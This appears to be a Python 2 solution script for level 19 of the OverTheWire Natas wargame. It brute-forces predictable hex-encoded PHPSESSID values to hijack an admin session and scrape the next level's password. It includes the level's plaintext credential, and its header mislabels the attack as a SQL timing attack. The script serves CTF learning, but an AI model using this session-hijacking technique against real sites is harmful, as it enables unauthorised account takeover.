#!/usr/bin/env python
# SQL TIMED ATTACK
import requests
import re
from string import *
from time import *

characters = lowercase + uppercase + digits	
	
username='natas19'
password='4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'

url = 'http://%s.natas.labs.overthewire.org/' %username
path = '/?debug=true'
session = requests.session()


# for i in range(1, 641):
# 	print "Trying value: ", str("%s-admin" %i).encode('hex')
# 	response = session.post(url, auth=(username, password), data={'username':'admin', 'password':''}, cookies={'PHPSESSID': str("%s-admin" %i).encode('hex')})
# 	content = response.text

# 	if ('You are an admin' in content):
# 		print "Got it!", str("%s-admin" %i).encode('hex')
# 		break


response = session.post(url, auth=(username, password), data={'username':'admin', 'password':''}, cookies={'PHPSESSID': "3238312d61646d696e"})
# response = session.post(url, auth=(username, password), data={'username':'admin', 'password':''})

content = response.text
print re.findall("Username: natas20\nPassword: (.*)</pre>", content)[0]

# print (session.cookies['PHPSESSID']).decode('hex')

# This level was bit tricky. On checking the PHPSESSID, it appeared to be a bit complicated and when generated the request multiple times, it showed that only the first few values were changing while the rest remained constant. Later on after removing the username from the post request parameter some values from PHPSESSID also vanished, stating it was being generated from the passed username. The value appeared to be in HEX and only decoding those values, those were varying between same 1 to 640 in last natas. So, to get the password this time the simple solution was to run a loop from 1 to 640 along with the username 'admin' in an encoded hex form and dertermine the PHPSESSID that has admin access and then pass it.